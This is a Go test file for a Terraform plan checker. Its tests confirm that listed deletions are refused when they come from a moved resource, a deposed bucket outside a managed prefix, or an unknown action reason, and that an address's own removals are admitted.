// B in neither state nor configuration is address=B, previous_address=A,
// actions=[delete], action_reason=delete_because_no_move_target, with A's
// object in before — so with B listed, A would be deleted. Refused for the
// move, whatever the resource; and a moved replace in either order, whose
// reason is no delete_because_*, refused by previous_address alone.
func TestManagedCoverRefusesAMovedDeleteUnderAListedAddress(t *testing.T) {
	p, err := parsePlan([]byte(movedDeletePlanJSON))
	if err != nil {
		t.Fatal(err)
	}
	moved := p.ResourceChanges[0]
	// A resource the cover would admit at its own address, so the move is
	// the only reason left to refuse it.
	moved.Change.Before = destroyed(managedKeptFixture["google_storage_bucket"]).Change.Before
	for name, mut := range map[string]func(*ResourceChange){
		"the no-move-target delete": func(*ResourceChange) {},
		"a moved replace, delete first": func(rc *ResourceChange) {
			rc.ActionReason = "replace_because_cannot_update"
			rc.Change.Actions = []string{"delete", "create"}
			rc.Change.After = rc.Change.Before
		},
		"a moved replace, create first": func(rc *ResourceChange) {
			rc.ActionReason = "replace_by_request"
			rc.Change.Actions = []string{"create", "delete"}
			rc.Change.After = rc.Change.Before
		},
		"delete_because_no_move_target with no previous address": func(rc *ResourceChange) { rc.PreviousAddress = "" },
	} {
		t.Run(name, func(t *testing.T) {
			rc := moved
			mut(&rc)
			c := managedTestCover().WithDeleteEntries(approving(rc))
			out := c.NotCovered(managedPlan(rc), nil)
			if len(out) != 1 || !strings.Contains(out[0], "moved here from") {
				t.Fatalf("a moved removal under a listed address gives %q, want it refused for the move", out)
			}
		})
	}
	// The control: the same change at its own address — no previous_address,
	// no move reason — is admitted, so the refusals above are the move's.
	own := moved
	own.PreviousAddress, own.ActionReason = "", ""
	if out := managedTestCover().WithDeleteEntries(approving(own)).NotCovered(managedPlan(own), nil); len(out) != 0 {
		t.Fatalf("the same delete without the move gives %q, want it covered", out)
	}
}

// TestManagedCoverAdmitsTheListedAddressOwnRemovals: the reasons that delete
// the listed address's own object — its configuration went away, or its count
// or for_each — and a deposed object of the listed address, judged on its own
// before like any other delete; a previous_address equal to the address is not
// a move.
func TestManagedCoverAdmitsTheListedAddressOwnRemovals(t *testing.T) {
	cases := map[string]func(*ResourceChange){
		"previous_address is the address": func(rc *ResourceChange) { rc.PreviousAddress = rc.Address },
		"a deposed object":                func(rc *ResourceChange) { rc.Deposed = "00000001" },
		"a tainted replace": func(rc *ResourceChange) {
			rc.ActionReason = "replace_because_tainted"
			rc.Change.Actions = []string{"delete", "create"}
			rc.Change.After = rc.Change.Before
		},
	}
	for _, r := range []string{"delete_because_no_resource_config", "delete_because_wrong_repetition",
		"delete_because_count_index", "delete_because_each_key", "delete_because_no_module"} {
		cases[r] = func(rc *ResourceChange) { rc.ActionReason = r }
	}
	for name, mut := range cases {
		t.Run(name, func(t *testing.T) {
			rc := destroyed(managedKeptFixture["google_storage_bucket"])
			mut(&rc)
			c := managedTestCover().WithDeleteEntries(approving(rc))
			if out := c.NotCovered(managedPlan(rc), nil); len(out) != 0 {
				t.Fatalf("a listed removal of the address's own object gives %q, want it covered", out)
			}
		})
	}
}

// TestManagedCoverJudgesADeposedObjectOnItsOwnBefore: a deposed object of a
// listed address is the address's own, and it is judged on the resource in its
// own before — a deposed bucket outside the managed prefix is refused although
// the address is listed and its current object would be admitted.
func TestManagedCoverJudgesADeposedObjectOnItsOwnBefore(t *testing.T) {
	rc := destroyed(managedKeptFixture["google_storage_bucket"])
	rc.Deposed = "00000001"
	rc.Change.Before = map[string]any{"name": "fugaro-runs-proj-1"}
	c := managedTestCover().WithDeleteEntries(approving(rc))
	out := c.NotCovered(managedPlan(rc), nil)
	if len(out) != 1 || !strings.Contains(out[0], "outside the managed prefix") {
		t.Fatalf("a listed deposed delete of a bucket outside the prefix gives %q, want the prefix rule", out)
	}
}

// TestManagedCoverRefusesAnUnknownRemovalReason: a delete or replace reason
// the managed rule has not read — one a later terraform adds — is refused
// rather than read as a removal of the address's own object.
func TestManagedCoverRefusesAnUnknownRemovalReason(t *testing.T) {
	rc := destroyed(managedKeptFixture["google_storage_bucket"])
	rc.ActionReason = "delete_because_something_new"
	c := managedTestCover().WithDeleteEntries(approving(rc))
	out := c.NotCovered(managedPlan(rc), nil)
	if len(out) != 1 || !strings.Contains(out[0], "action_reason delete_because_something_new") {
		t.Fatalf("an unknown removal reason gives %q, want it refused", out)
	}
}
